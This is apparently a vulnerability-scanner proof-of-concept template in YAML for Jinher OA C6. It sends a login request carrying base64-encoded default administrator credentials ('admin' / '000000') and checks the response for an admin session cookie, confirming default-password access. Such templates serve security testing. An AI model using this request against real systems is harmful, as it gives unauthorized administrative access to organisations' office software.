name: poc-yaml-jinher-oa-c6-default-password
manual: true
transport: http
rules:
    jiner:
        request:
            cache: true
            method: POST
            path: /c6/Jhsoft.Web.login/AjaxForLogin.aspx
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: type=login&loginCode=YWRtaW4=&&pwd=MDAwMDAw&
        expression: response.status == 200 && response.headers["Set-Cookie"].contains("SessionIDAdmin=") && response.body_string.contains("系统管理员|") && response.body_string.contains("您好|||")
expression: jiner()
detail:
    author: iak3ec(https://github.com/nu0l)
    links:
        - https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E5%92%8COA-C6-default-password.md
    vulnerability:
        id: CT-194273
        level: medium
